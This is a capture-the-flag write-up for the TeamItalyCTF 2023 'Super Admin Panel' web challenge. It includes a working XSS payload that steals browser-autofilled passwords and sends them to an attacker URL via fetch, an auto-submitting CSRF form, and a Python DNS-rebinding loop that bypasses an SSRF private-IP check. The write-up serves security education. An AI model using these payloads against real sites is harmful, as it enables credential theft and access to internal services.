# TeamItalyCTF 2023

## [web] Super Admin Panel (30 solves)
Try to hack our new and improved super admin panel! There is a special surprise for you available at 127.0.0.1:1337!

The challenge is reachable with hostname "web03" from within the container, the 1337 port remains correct. The challenge is always reachable from its URL.

Site: http://superadminpanel.challs.teamitaly.eu

Author: Jacopo Di Pumpo <@shishcat>

## Solution

Upon opening the website, we encounter a login page for an admin panel.

By inspecting the source code, we discover that the username is set to "admin," but the password remains unknown. The server expects users to input the password in base64 encoding.

Authentication on the server side is done securely comparing a SHA256 hash, but there's a vulnerability on the client side due to the presence of an admin bot. To gain access to the panel, we must exploit a client-side flaw.

The admin panel offers just one functionality: the ability to make HTTP GET requests to arbitrary URLs. However, the server verifies that the IP is not a private one before executing these requests, seemingly making it impossible to proceed: the flag is at 127.0.0.1:1337.

We can notice that the website has an XSS flaw: if you insert a wrong base64 password, the server will decode it and print it back to the user without any sanitization.

The bot doesn't have an authenticated cookie for the admin panel, and neither does it login with credentials. It just triggers the browser autofill system and clicks the "#pwn" button.
We can use [this attack](https://www.gosecure.net/blog/2022/06/29/did-you-know-your-browsers-autofill-credentials-could-be-stolen-via-cross-site-scripting-xss/): allows us to steal the autofill credentials by accessing the value of the fields that are automatically filled in once the bot clicks any button on the website.

Payload:
```js
document.addEventListener("DOMContentLoaded", ()=>{
    const passwordInput = document.getElementById("password");
    document.getElementById("pwn").addEventListener("click", () => {
        const password = passwordInput.value;
        if(passwordInput.value == "") return;
        fetch("{LEAK_URL}?"+encodeURIComponent(password));
    });
});
```

To actually exploit the XSS, we need to create an autofilling form on our server (CSRF):
```html
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>1</title>
</head>
<body>
    <form action="{URL}/panel" method="post">
        <input type="hidden" name="username" value="admin">
        <input type="hidden" name="password" value="{JS_PAYLOAD_BASE64}">
    </form>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            document.querySelector('form').submit();
        });
    </script>
</body>
```
We can send the link to this page to the bot, which will automatically submit the form with the exploit in the password field. This action triggers the "Wrong password" XSS attack on the website. As soon as the bot presses "#pwn," it steals the credentials and sends them to our server.

Now that we got in the panel, we need to get the contents of 127.0.0.1:1337 to obtain the flag.

The server checks whether the IP is local with a DNS request, and the way to bypass this check is with a DNS rebinding attack.

Note that in the payload, we utilize the service rbndr.us, which performs DNS rebinding by altering the DNS response with two different IPs having a low TTL. This may require several attempts before successfully returning the flag.

```python
    while True:
        try:
            x = requests.post(URL + "/panel", cookies={"passw": password},
                              data={"link": "http://7f000001.c0a80001.rbndr.us:1337/"},
                              timeout=2)
            if "Hackers not allowed" in x.text:
                print(".", end="", flush=True)

            if "Content: " in x.text:
                flag = x.text.split("Content: ")[1].split("<")[0]
                print(flag, end="\n", flush=True)
                break

            time.sleep(0.2)
        except:
            print("!", end="", flush=True)
```

